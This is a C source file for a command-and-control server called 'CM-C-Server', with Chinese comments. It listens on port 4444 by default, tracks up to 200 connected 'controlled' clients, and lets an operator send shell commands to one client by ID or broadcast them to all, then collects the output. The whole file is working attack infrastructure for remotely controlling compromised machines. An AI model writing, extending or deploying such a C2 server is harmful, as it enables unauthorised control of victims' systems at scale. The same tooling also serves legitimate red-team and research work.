#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

// 项目的头文件
#include "version_info.h"

#ifdef _WIN32
    #ifdef _WIN32_WINNT
        #undef _WIN32_WINNT
    #endif
    #define _WIN32_WINNT 0x0600 // 启用 Windows Vista 及以上的新网络 API
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #define close closesocket
    #ifndef STDIN_FILENO
        #define STDIN_FILENO 0
    #endif
    #ifdef _MSC_VER
        #pragma comment(lib, "ws2_32.lib")
    #endif
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <sys/select.h>
    #include <fcntl.h>
    #include <errno.h>
#endif

// 默认配置，可以根据需要修改 C2 的监听 IP 和端口
#ifndef START_IP
    #define START_IP "127.0.0.1"
#endif
#ifndef START_PORT
    #define START_PORT 4444
#endif

#define MAX_CLIENTS 200
#define BUF_SIZE 8192

typedef struct {
    int fd;
    int id;
} Client;

Client clients[MAX_CLIENTS] = {0};
int client_count = 0;
int next_id = 1;

int find_client_by_id(int id) {
    for (int i = 0; i < client_count; i++) {
        if (clients[i].id == id) return i;
    }
    return -1;
}

int find_client_by_fd(int fd) {
    for (int i = 0; i < client_count; i++) {
        if (clients[i].fd == fd) return i;
    }
    return -1;
}

void remove_client(int index) {
    close(clients[index].fd);
    memmove(&clients[index], &clients[index+1], (client_count-index-1)*sizeof(Client));
    client_count--;
}

// 全平台通用的跨平台超时等待
int wait_for_fd_readable(int fd, int timeout_ms) {
    fd_set rset;
    FD_ZERO(&rset);
    FD_SET((unsigned int)fd, &rset);
    
    struct timeval tv;
    tv.tv_sec = timeout_ms / 1000;
    tv.tv_usec = (timeout_ms % 1000) * 1000;
    
    return select(fd + 1, &rset, NULL, NULL, &tv);
}

// 获取当前日期 ISO 格式 2025-01-01
const char* date_iso() {
    static char buf[32];
    time_t now = time(NULL);
    struct tm* t = localtime(&now);
    sprintf(buf, "%04d-%02d-%02d", t->tm_year+1900, t->tm_mon+1, t->tm_mday);
    return buf;
}

// 彩色Logo和当前程序信息和当前程序文件名
int show_logo_info(const char *prog_name) {

#define RED     "\033[31m"
#define GREEN   "\033[32m"
#define YELLOW  "\033[33m"
#define BLUE    "\033[34m"
#define CYAN    "\033[36m"


#define OVERLINE "\033[53m" // 上划线
#define STRIKETHROUGH "\033[9m" // 删除线
#define UNDERLINE "\033[4m" // 下划线
#define BOLD    "\033[1m" // 粗体

#define RESET   "\033[0m"

    char logo_buf[1024];  // logo 足够大的缓冲区
    char info_buf[512];  // info 足够大的缓冲区
    
    // 拼接彩色Logo字符串
    sprintf(logo_buf,
        "%s   _____    __  __               %s_____  %s\r\n"
        "%s  / ____|  |  \\/  |             %s/ ____| %s\r\n"
        "%s | |       | \\  / |   %s___%s___   %s| |      %s\r\n"
        "%s | |       | |\\/| |  %s|___%s___|  %s| |      %s\r\n"
        "%s | |____   | |  | |            %s| |____   %s\r\n"
        "%s  \\_____|  |_|  |_|             %s\\_____|%s\r\n\n",
        "\r\n"
        RED, BLUE, RESET,
        RED, BLUE, RESET,
        GREEN, YELLOW, CYAN, BLUE, RESET,
        GREEN, YELLOW, CYAN, BLUE, RESET,
        BLUE, RED, RESET,
        BLUE, RED, RESET
    );

    // 当前程序的版本号和构建日期和构建时间和项目URL和Issue URL
        sprintf(info_buf,
            "%sVersion: %s%s%s%s, %sBuild: %s%s%s %s%s\r\n",
            // "%sProjectURL: %s%s%s\r\n"
	        // "%sIssueURL: %s%s%s\r\n",

        RED, BOLD, UNDERLINE, VERSION_STR, RESET, BLUE, BOLD, UNDERLINE, /*BUILD_DATE*/date_iso(), BUILD_TIME, RESET//,
        // GREEN, BOLD, PROJECT_URL, RESET, YELLOW, BOLD, ISSUE_URL, RESET, RESET,
    );

    // 显示完整Logo和当前程序信息和当前程序文件名
    printf("%s", logo_buf);
    printf("\tCM-C-Server:%s\r\n", prog_name);
    printf("%s", info_buf);

    return 0;
}

// 精准处理单个客户端的数据接收，直到读齐它的结果和提示符
void handle_single_client_sync(int idx, const char *msg) {
    send(clients[idx].fd, msg, (int)strlen(msg), 0);
    
    printf("[%d]:\n", clients[idx].id);
    fflush(stdout);
    
    char recv_accum[BUF_SIZE * 2] = {0};
    
    while (1) {
        int ret = wait_for_fd_readable(clients[idx].fd, 1500);
        if (ret <= 0) break; 
        
        char chunk[BUF_SIZE] = {0};
        int len = recv(clients[idx].fd, chunk, BUF_SIZE - 1, 0);
        if (len <= 0) break;
        
        if (len == 1 && (chunk[0] == 'Y' || chunk[0] == 'V')) {
            continue;
        }
        
        chunk[len] = '\0';
        if (strlen(recv_accum) + len < sizeof(recv_accum) - 1) {
            strcat(recv_accum, chunk);
        } else {
            break;
        }
        
        if (strstr(recv_accum, "->") != NULL || strstr(recv_accum, "-{20") != NULL) {
            break;
        }
    }
    
    char *clean_p = recv_accum;
    while (*clean_p == '\n' || *clean_p == '\r' || *clean_p == ' ') clean_p++;
    
    size_t clen = strlen(clean_p);
    while (clen > 0 && (clean_p[clen - 1] == '\n' || clean_p[clen - 1] == '\r' || clean_p[clen - 1] == ' ')) {
        clean_p[clen - 1] = '\0';
        clen--;
    }
    
    if (clen > 0) {
        char *prompt_ptr = strstr(clean_p, "-{20");
        if (prompt_ptr != NULL) {
            if (prompt_ptr > clean_p) {
                char save = *prompt_ptr;
                *prompt_ptr = '\0';
                printf("%s\n", clean_p);
                *prompt_ptr = save;
            }
            
            char *p = prompt_ptr;
            while (*p == '\n' || *p == '\r') p++;
            printf("%s\n\n", p);
        } else {
            printf("%s\n\n", clean_p);
        }
    } else {
        printf("(No response)\n\n");
    }
    fflush(stdout);
}

void print_usage(const char *prog_name) {
    printf("Usage:\n  %s\n  %s [IP/any] [Port]\n", prog_name, prog_name);
}

void print_menu(const char *prog_name, const char *server_ip, int port) {
    printf("Usage: %s\n", prog_name);
    printf("  ID command     -> Send to specific client\n");
    printf("  all command    -> Broadcast to all clients\n");
    printf("  list           -> View online client list\n");
    printf("  help           -> Show this menu\n");
    printf("  exit/quit      -> Close server\n");
    printf("----------------------------------------\n");
    printf("listening on (%s) %d ...\n", server_ip, port);
    fflush(stdout);
}

int main(int argc, char *argv[]) {
    show_logo_info(argv[0]);

    const char *server_ip = START_IP;
    int port = START_PORT;
    char *prog_name = argv[0];

    if (argc == 2 && (strcmp(argv[1], "-h") == 0 || strcmp(argv[1], "--help") == 0)) {
        print_usage(prog_name);
        return 0;
    }
    if (argc != 1 && argc != 3) {
        print_usage(prog_name);
        return 1;
    }
    if (argc == 3) {
        server_ip = argv[1];
        port = atoi(argv[2]);
    }
    
#ifdef _WIN32
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
#endif

    int server_fd = (int)socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
#ifdef _WIN32
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, (const char*)&opt, sizeof(opt));
#else
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
#endif
    
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = (strcmp(server_ip, "0.0.0.0") == 0 || strcmp(server_ip, "any") == 0) ? INADDR_ANY : inet_addr(server_ip);
    bind(server_fd, (struct sockaddr*)&addr, sizeof(addr));
    listen(server_fd, 10);
    
    // 首次运行贴心地打印一次菜单引导
    print_menu(prog_name, server_ip, port);

    while (1) {
        fd_set master_set;
        FD_ZERO(&master_set);
        FD_SET((unsigned int)server_fd, &master_set);
        
#ifndef _WIN32
        FD_SET(STDIN_FILENO, &master_set);
#endif

        struct timeval main_tv;
        main_tv.tv_sec = 0;
        main_tv.tv_usec = 100000;
        
        int max_fd = server_fd;
        int select_ret = select(max_fd + 1, &master_set, NULL, NULL, &main_tv);
        
        if (select_ret < 0) break;
        
        // 监听新连接
        if (FD_ISSET(server_fd, &master_set)) {
            int client_fd = (int)accept(server_fd, NULL, NULL);
            if (client_fd >= 0) {
                if (client_count >= MAX_CLIENTS) {
                    close(client_fd);
                } else {
                    clients[client_count].fd = client_fd;
                    clients[client_count].id = next_id++;
                    client_count++;
                    printf("[*] Client[%d] connected (Total online: %d)\n", clients[client_count-1].id, client_count);
                    fflush(stdout);
                }
            }
        }
        
        // 检测标准输入
        int stdin_has_data = 0;
#ifdef _WIN32
        if (GetStdHandle(STD_INPUT_HANDLE) != INVALID_HANDLE_VALUE) {
            DWORD dwEvents = 0;
            GetNumberOfConsoleInputEvents(GetStdHandle(STD_INPUT_HANDLE), &dwEvents);
            if (dwEvents > 0) stdin_has_data = 1;
        }
#else
        if (FD_ISSET(STDIN_FILENO, &master_set)) stdin_has_data = 1;
#endif

        if (stdin_has_data) {
            char buf[BUF_SIZE] = {0};
            if (fgets(buf, BUF_SIZE - 1, stdin) != NULL) {
                size_t len = strlen(buf);
                if (len > 0 && buf[len - 1] == '\n') buf[len - 1] = '\0';
                if (len > 1 && buf[len - 2] == '\r') buf[len - 2] = '\0';
                
                if (strlen(buf) == 0) continue;

                // 退出命令
                if (strcmp(buf, "exit") == 0 || strcmp(buf, "quit") == 0) break;
                
                // 帮助命令
                if (strcmp(buf, "help") == 0) {
                    print_menu(prog_name, server_ip, port);
                    continue;
                }
                // 在线受控端命令
                if (strcmp(buf, "list") == 0) {
                    for (int i = 0; i < client_count; i++) printf("[%d]\n", clients[i].id);
                    fflush(stdout);
                    continue;
                }
                
                char *space = strchr(buf, ' ');
                if (!space) continue;
                
                *space = '\0';
                char *target = buf;
                char *msg = space + 1;
                while (*msg == ' ') msg++;
                
                char send_buf[BUF_SIZE + 2];
                snprintf(send_buf, sizeof(send_buf), "%s\n", msg);
                
                if (strcmp(target, "all") == 0) {
                    int current_total = client_count;
                    for (int i = 0; i < current_total; i++) {
                        handle_single_client_sync(i, send_buf);
                    }
                } else {
                    int target_id = atoi(target);
                    int idx = find_client_by_id(target_id);
                    if (idx != -1) {
                        handle_single_client_sync(idx, send_buf);
                    }
                }
            }
        }
        
        // 挂机清理
        for (int i = 0; i < client_count; i++) {
            if (wait_for_fd_readable(clients[i].fd, 1) > 0) {
                char check_buf[1] = {0};
                int check_ret = recv(clients[i].fd, check_buf, 1, MSG_PEEK);
                if (check_ret <= 0) {
                    printf("[!] Client[%d] disconnected\n", clients[i].id);
                    remove_client(i);
                    i--;
                }
            }
        }
    }
    
    for (int i = 0; i < client_count; i++) close(clients[i].fd);
    close(server_fd);
#ifdef _WIN32
    WSACleanup();
#endif
    return 0;
}